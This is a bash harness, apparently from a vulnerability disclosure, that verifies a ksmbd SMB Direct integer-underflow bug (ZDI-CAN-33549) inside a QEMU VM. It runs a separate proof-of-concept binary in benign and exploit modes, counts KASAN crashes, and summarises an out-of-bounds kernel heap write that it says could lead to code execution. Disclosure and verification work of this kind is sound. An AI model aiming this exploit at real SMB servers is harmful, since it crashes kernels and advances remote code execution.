#!/bin/bash
# Author: al4n4n (Dadb0d)
# Verify ZDI-CAN-33549: run control + exploit, show KASAN/crash evidence, verdict.
# Run inside the QEMU VM (needs dmesg access).
#
# Usage: bash verify.sh <target-ip> [user] [password] [s3rig-path] [rounds]
#        bash verify.sh 10.0.2.15
#        bash verify.sh 10.0.2.15 s3guest test ./poc/s3rig 3
#        bash verify.sh --no-negative 10.0.2.15
set -u

NO_NEGATIVE=0
if [ "${1:-}" = "--no-negative" ]; then
    NO_NEGATIVE=1
    shift
fi

HOST="${1:-10.0.2.15}"
USER="${2:-s3guest}"
PASS="${3:-test}"
S3RIG="${4:-./poc/s3rig}"
ROUNDS="${5:-1}"

RED='\033[0;31m'
GRN='\033[0;32m'
YEL='\033[0;33m'
CYN='\033[0;36m'
BLD='\033[1m'
RST='\033[0m'

# --- Header ---
echo ""
echo -e "${BLD}================================================================${RST}"
echo -e "${BLD}  ZDI-CAN-33549  —  ksmbd SMB Direct Integer Underflow${RST}"
echo -e "${BLD}  Verification Dashboard${RST}"
echo -e "${BLD}================================================================${RST}"
echo ""

# --- Environment ---
echo -e "${CYN}Environment:${RST}"
echo "  Target:     $HOST"
echo "  User:       $USER"
echo "  PoC:        $S3RIG"
echo "  Rounds:     $ROUNDS"
KVER=$(uname -r 2>/dev/null || echo "unknown")
echo "  Kernel:     $KVER"
RXE=$(rdma link show rxe0 2>/dev/null | grep -o 'state [A-Z]*' || echo "not found")
echo "  RDMA (rxe): $RXE"
echo ""

if [ ! -x "$S3RIG" ]; then
    echo -e "${RED}[!] s3rig not found or not executable: $S3RIG${RST}"
    echo "    Build with: cd poc && make"
    exit 2
fi

# --- Phase 1: Control (benign RDMA write) ---
echo -e "${BLD}--- Phase 1: Control (benign RDMA write) ---${RST}"
dmesg -C 2>/dev/null
CTRL_OUT=$("$S3RIG" -h "$HOST" -u "$USER" -p "$PASS" -m control 2>&1)
CTRL_RC=$?
sleep 1
CTRL_KASAN=$(dmesg 2>/dev/null | grep -c "BUG: KASAN\|Oops\|general protection")

if echo "$CTRL_OUT" | grep -q "CONTROL benign_rdma_write=ok"; then
    echo -e "  ${GRN}[+] Control WRITE succeeded${RST}"
else
    echo -e "  ${RED}[!] Control WRITE failed${RST}"
    echo "$CTRL_OUT" | head -5
fi

if [ "$CTRL_KASAN" -eq 0 ]; then
    echo -e "  ${GRN}[+] No KASAN/crash — baseline clean${RST}"
else
    echo -e "  ${YEL}[!] KASAN/crash during control (unexpected)${RST}"
fi
echo ""

# --- Phase 2: Exploit (dirA — integer underflow OOB write) ---
echo -e "${BLD}--- Phase 2: Exploit (dirA — OOB write via integer underflow) ---${RST}"
VULN_COUNT=0
PROGRESS=""
for i in $(seq 1 "$ROUNDS"); do
    dmesg -C 2>/dev/null
    EXPLOIT_OUT=$("$S3RIG" -h "$HOST" -u "$USER" -p "$PASS" -m dirA 2>&1)
    sleep 2
    KASAN=$(dmesg 2>/dev/null | grep -c "BUG: KASAN\|Oops\|general protection")
    if [ "$KASAN" -gt 0 ]; then
        VULN_COUNT=$((VULN_COUNT + 1))
        PROGRESS="${PROGRESS}!"
    else
        PROGRESS="${PROGRESS}."
    fi
done
echo "  Progress: $PROGRESS"
echo "  Crashes:  $VULN_COUNT / $ROUNDS"
echo ""

# --- Phase 3: Crash Evidence ---
echo -e "${BLD}--- Phase 3: Crash Evidence ---${RST}"
KASAN_LOG=$(dmesg 2>/dev/null | grep -B2 -A 15 "BUG: KASAN" | head -20)
GPF_LOG=$(dmesg 2>/dev/null | grep "4141414141\|general protection" | head -5)
ALLOC_LOG=$(dmesg 2>/dev/null | grep -A 5 "Allocated by task" | head -8)

if [ -n "$KASAN_LOG" ]; then
    echo -e "${RED}KASAN report:${RST}"
    echo "$KASAN_LOG"
    echo ""
fi
if [ -n "$ALLOC_LOG" ]; then
    echo -e "${RED}Allocation trace:${RST}"
    echo "$ALLOC_LOG"
    echo ""
fi
if [ -n "$GPF_LOG" ]; then
    echo -e "${RED}GPF / corrupted pointer:${RST}"
    echo "$GPF_LOG"
    echo ""
fi
if [ -z "$KASAN_LOG" ] && [ -z "$GPF_LOG" ]; then
    echo "  (no crash evidence in dmesg)"
    echo ""
fi

# --- Phase 4: Negative Control ---
if [ "$NO_NEGATIVE" -eq 0 ]; then
    echo -e "${BLD}--- Phase 4: Negative Control ---${RST}"
    echo "  NOTE: For a proper negative control, boot a kernel with the fix"
    echo "  (commit 5b8ce2e: remove 'buf_len = 0;' from fs/smb/smbdirect/rw.c)"
    echo "  and re-run this script. The patched kernel should show 0 crashes."
    echo ""
    echo "  Manual verification command:"
    echo "    dmesg | grep -c 'BUG: KASAN\\|Oops\\|general protection'"
    echo ""
fi

# --- Verdict ---
echo -e "${BLD}================================================================${RST}"
if [ "$VULN_COUNT" -gt 0 ]; then
    RATE=$((VULN_COUNT * 100 / ROUNDS))
    echo -e "  Verdict: ${RED}${BLD}VULNERABLE${RST}  ($VULN_COUNT/$ROUNDS rounds crashed, ${RATE}%)"
    echo ""
    echo "  Impact:"
    echo "    OOB heap write: 1024+ bytes past 8-byte kmalloc-8 allocation"
    echo "    Write origin:   smbdirect_connection_rdma_xmit → rxe_mr_copy"
    echo "    Alloc origin:   smb2_write → handle_ksmbd_work"
    echo "    Corruption:     attacker-controlled data in adjacent SLAB objects"
    echo "    Crash:          GPF at 0x4141414141414141 (our write pattern)"
    echo "    Consequence:    kernel crash (DoS), demonstrates mechanism for RCE"
    echo ""
    echo "  Manual check:"
    echo "    dmesg | grep -A20 'BUG: KASAN'"
    echo -e "${BLD}================================================================${RST}"
    exit 0
else
    echo -e "  Verdict: ${GRN}${BLD}NOT VULNERABLE${RST}  (0/$ROUNDS rounds crashed)"
    echo -e "${BLD}================================================================${RST}"
    exit 1
fi
